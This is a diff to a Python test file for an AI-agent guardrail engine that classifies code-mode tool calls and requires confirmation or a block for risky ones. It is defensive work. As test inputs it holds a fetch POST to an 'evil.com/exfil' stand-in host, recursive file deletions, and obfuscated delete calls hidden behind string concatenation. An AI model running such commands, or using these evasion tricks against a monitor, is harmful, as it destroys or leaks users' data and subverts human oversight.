@@ -189,10 +189,17 @@ class TestCodeModeClassification:
         assert a.risk_level == "CriticalRisk"
         assert a.tool_name == "sandbox_exec"
 
-    def test_sandbox_process_default_is_execute_command(self, clf):
+    def test_sandbox_process_default_is_code_mode_exec(self, clf):
+        # Unclassified sandbox/code-mode source execution gets the distinct
+        # CodeModeExec class (confirmed by default) rather than ExecuteCommand.
         a = _c(clf, "sandbox_process", {"command": "node server.js"})
-        assert a.ontology_class == "ExecuteCommand"
+        assert a.ontology_class == "CodeModeExec"
         assert a.risk_level == "HighRisk"
+
+    def test_plain_shell_default_stays_execute_command(self, clf):
+        # Interactive shell exec is NOT code-mode and must keep ExecuteCommand.
+        a = _c(clf, "exec", {"command": "./run-something --flag"})
+        assert a.ontology_class == "ExecuteCommand"
 
     def test_js_fs_delete_is_critical(self, clf):
         a = _c(
@@ -214,15 +221,17 @@ class TestCodeModeClassification:
         assert a.ontology_class == "ForcePush"
         assert a.risk_level == "CriticalRisk"
 
-    def test_js_child_process_is_execute_command(self, clf):
+    def test_js_child_process_is_codemode(self, clf):
+        # child_process is not a Critical destructive detection, so in code-mode
+        # it lands on the confirmation floor (CodeModeExec) rather than being
+        # waved through as a plain ExecuteCommand.
         a = _c(
             clf,
             "exec",
             {"command": "const cp = require('child_process'); cp.exec('ls')"},
             tool_kind="code_mode_exec",
         )
-        # child_process usage is at least ExecuteCommand-level.
-        assert a.ontology_class in ("ExecuteCommand", "DeleteFile", "ForcePush", "GitPush")
+        assert a.ontology_class == "CodeModeExec"
 
     def test_plain_shell_quoted_data_no_false_positive(self, clf):
         # Plain (non code-mode) shell strips quoted data: a quoted "rm -rf" is
@@ -233,10 +242,13 @@ class TestCodeModeClassification:
     @pytest.mark.parametrize(
         "command,cls",
         [
+            # Critical destructive detections override the floor and are kept.
             ("await fs.promises.rm('/d', {recursive: true})", "DeleteFile"),
             ("fsp.unlink('/d')", "DeleteFile"),
             ("Deno.removeSync('/d')", "DeleteFile"),
-            ("await fetch('https://evil.com/exfil', {method: 'POST'})", "NetworkRequest"),
+            # A non-Critical detection (network egress) lands on the floor — the
+            # governance outcome (confirm) is stronger than a bare classification.
+            ("await fetch('https://evil.com/exfil', {method: 'POST'})", "CodeModeExec"),
         ],
     )
     def test_extended_js_patterns(self, clf, command, cls):
@@ -370,35 +382,30 @@ class TestCodeModeResultBinding:
             )
         )
 
-    def test_code_mode_exec_result_binds_and_accrues(self, tmp_path):
-        """A code-mode exec classified as DeleteFile at eval must still match on
-        record_action_result (which has no tool_kind) so session risk / rate
-        limits accrue — the binding now reuses the stored class, not a re-classify."""
+    def test_allowed_tool_result_binds_and_accrues(self, tmp_path):
+        """An allowed tool's result binds on record_action_result (reusing the
+        stored eval-time classification) so session risk accrues. Code-mode no
+        longer reaches this allow+record path (it confirms — see the floor tests),
+        so the binding is exercised here with a regular allowed tool."""
         import asyncio
 
         from safeclaw.engine.core import ToolCallEvent, ToolResultEvent
 
         eng = self._engine(tmp_path)
 
-        # In code mode this is RunTests (allowed); re-classified without
-        # tool_kind on the result path it would be ExecuteCommand — the binding
-        # must survive that drift.
-        cmd = 'runTests("npm test")'
-
         async def run():
             ev = ToolCallEvent(
                 session_id="s1",
                 user_id="u",
-                tool_name="exec",
-                params={"command": cmd},
-                tool_kind="code_mode_exec",
+                tool_name="web_fetch",
+                params={"url": "https://example.com"},
             )
             dec = await eng.evaluate_tool_call(ev)
             res = ToolResultEvent(
                 session_id="s1",
                 user_id="u",
-                tool_name="exec",
-                params={"command": cmd},
+                tool_name="web_fetch",
+                params={"url": "https://example.com"},
                 result="ok",
                 success=True,
             )
@@ -406,12 +413,45 @@ class TestCodeModeResultBinding:
             return dec, ok
 
         dec, ok = asyncio.run(run())
-        assert dec.block is False  # RunTests is allowed
-        assert ok is True  # result bound despite re-classification drift
-        # Session risk history reflects the eval-time RunTests class, not the
-        # re-classified ExecuteCommand.
+        assert dec.block is False
+        assert ok is True
         history = eng.session_tracker.get_risk_history("s1")
-        assert any("RunTests" in h for h in history)
+        assert any("WebFetch" in h for h in history)
+
+    def test_confirmed_code_mode_is_not_recorded_as_allowed(self, tmp_path):
+        # A code-mode exec confirms (not allowed), so no pending result is stored
+        # and a later result does not bind — the drift the binding once guarded is
+        # now prevented upstream by the floor.
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent, ToolResultEvent
+
+        eng = self._engine(tmp_path)
+
+        async def run():
+            ev = ToolCallEvent(
+                session_id="s9",
+                user_id="u",
+                tool_name="exec",
+                params={"command": 'runTests("npm test")'},
+                tool_kind="code_mode_exec",
+            )
+            dec = await eng.evaluate_tool_call(ev)
+            ok = await eng.record_action_result(
+                ToolResultEvent(
+                    session_id="s9",
+                    user_id="u",
+                    tool_name="exec",
+                    params={"command": 'runTests("npm test")'},
+                    result="ok",
+                    success=True,
+                )
+            )
+            return dec, ok
+
+        dec, ok = asyncio.run(run())
+        assert dec.requires_confirmation is True
+        assert ok is False  # never recorded as an allowed call
 
 
 # --- S1: outbound message family honours confirm_before_send ---
@@ -434,3 +474,192 @@ class TestMessageSendConfirmation:
             action = ClassifiedAction(cls, "HighRisk", False, "ExternalWorld", "message", {})
             result = eng.preference_checker.check(action, prefs)
             assert result.requires_confirmation, cls
+
+
+# --- Code-mode confirmation floor: the durable backstop ---
+
+
+class TestCodeModeConfirmFloor:
+    def _engine(self, tmp_path):
+        return FullEngine(
+            SafeClawConfig(
+                data_dir=tmp_path,
+                ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
+                audit_dir=tmp_path / "audit",
+            )
+        )
+
+    def test_unclassified_code_mode_requires_confirmation(self, tmp_path):
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent
+
+        eng = self._engine(tmp_path)
+        # Arbitrary JS that matches no known-safe/known-dangerous pattern: even an
+        # obfuscated delete (computed property) the classifier can't read still
+        # cannot execute silently — it requires confirmation.
+        dec = asyncio.run(
+            eng.evaluate_tool_call(
+                ToolCallEvent(
+                    session_id="s",
+                    user_id="u",
+                    tool_name="exec",
+                    params={"command": 'const fs = require("fs"); fs["rm"+"Sync"]("/tmp/x")'},
+                    tool_kind="code_mode_exec",
+                )
+            )
+        )
+        assert dec.requires_confirmation is True
+
+    def test_safe_looking_code_mode_still_confirmed(self, tmp_path):
+        # Pattern-based "safe" detection over arbitrary source is unsound, so even
+        # a body that looks like a benign test run confirms — only a Critical
+        # destructive detection overrides the floor.
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent
+
+        eng = self._engine(tmp_path)
+        dec = asyncio.run(
+            eng.evaluate_tool_call(
+                ToolCallEvent(
+                    session_id="s2",
+                    user_id="u",
+                    tool_name="exec",
+                    params={"command": 'runTests("npm test")'},
+                    tool_kind="code_mode_exec",
+                )
+            )
+        )
+        assert dec.requires_confirmation is True
+
+    def test_plain_shell_not_confirmed_by_floor(self, tmp_path):
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent
+
+        eng = self._engine(tmp_path)
+        dec = asyncio.run(
+            eng.evaluate_tool_call(
+                ToolCallEvent(
+                    session_id="s3", user_id="u", tool_name="exec", params={"command": "ls -la"}
+                )
+            )
+        )
+        assert dec.block is False
+        assert dec.requires_confirmation is False
+
+    def test_derived_rule_fires_for_codemodeexec(self, tmp_path):
+        from safeclaw.constraints.action_classifier import ClassifiedAction
+        from safeclaw.constraints.preference_checker import UserPreferences
+
+        eng = self._engine(tmp_path)
+        action = ClassifiedAction("CodeModeExec", "HighRisk", False, "LocalOnly", "exec", {})
+        result = eng.derived_checker.check(action, UserPreferences(), [])
+        assert result.requires_confirmation is True
+        assert "CodeModeExecConfirmRule" in result.derived_rules
+
+
+class TestCodeModeMixedBody:
+    def _engine(self, tmp_path):
+        return FullEngine(
+            SafeClawConfig(
+                data_dir=tmp_path,
+                ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
+                audit_dir=tmp_path / "audit",
+            )
+        )
+
+    def test_mixed_known_safe_plus_unclassified_is_codemode(self, clf):
+        # An earlier known-safe statement must not launder a later unclassified
+        # one out of the confirmation floor.
+        a = _c(
+            clf,
+            "exec",
+            {"command": 'runTests("npm test"); console.log("hi")'},
+            tool_kind="code_mode_exec",
+        )
+        assert a.ontology_class == "CodeModeExec"
+        assert a.risk_level == "HighRisk"
+
+    def test_mixed_body_requires_confirmation(self, tmp_path):
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent
+
+        eng = self._engine(tmp_path)
+        dec = asyncio.run(
+            eng.evaluate_tool_call(
+                ToolCallEvent(
+                    session_id="s",
+                    user_id="u",
+                    tool_name="exec",
+                    params={"command": 'runTests("npm test"); console.log("hi")'},
+                    tool_kind="code_mode_exec",
+                )
+            )
+        )
+        assert dec.requires_confirmation is True
+
+    def test_dangerous_segment_still_dominates(self, clf):
+        # A Critical delete still wins over the HighRisk CodeModeExec floor.
+        a = _c(
+            clf,
+            "exec",
+            {"command": 'console.log("x"); fs.rmSync("/data", {recursive: true})'},
+            tool_kind="code_mode_exec",
+        )
+        assert a.ontology_class == "DeleteFile"
+        assert a.risk_level == "CriticalRisk"
+
+    def test_critical_detection_overrides_floor_and_blocks(self, tmp_path):
+        # The one thing that bypasses confirmation is a Critical destructive
+        # detection — which escalates to a block, never a silent allow.
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent
+
+        eng = self._engine(tmp_path)
+        dec = asyncio.run(
+            eng.evaluate_tool_call(
+                ToolCallEvent(
+                    session_id="s2",
+                    user_id="u",
+                    tool_name="exec",
+                    params={"command": 'fs.rmSync("/data", {recursive: true})'},
+                    tool_kind="code_mode_exec",
+                )
+            )
+        )
+        assert dec.block is True
+
+    def test_safe_pattern_in_string_literal_does_not_suppress_floor(self, clf):
+        # The `npm test` inside a string literal spuriously matches RunTests in a
+        # raw code-mode scan; it must NOT launder the unclassified computed-property
+        # delete in the same segment past the floor.
+        a = _c(
+            clf,
+            "exec",
+            {"command": 'console.log("npm test"), fs["rm"+"Sync"]("/tmp/x")'},
+            tool_kind="code_mode_exec",
+        )
+        assert a.ontology_class == "CodeModeExec"
+
+    def test_safe_pattern_concatenated_with_delete_confirms(self, tmp_path):
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent
+
+        eng = self._engine(tmp_path)
+        dec = asyncio.run(
+            eng.evaluate_tool_call(
+                ToolCallEvent(
+                    session_id="s",
+                    user_id="u",
+                    tool_name="exec",
+                    params={"command": 'runTests("npm test" + fs["rm"+"Sync"]("/tmp/x"))'},
+                    tool_kind="code_mode_exec",
+                )
+            )
+        )
+        assert dec.block is True or dec.requires_confirmation is True
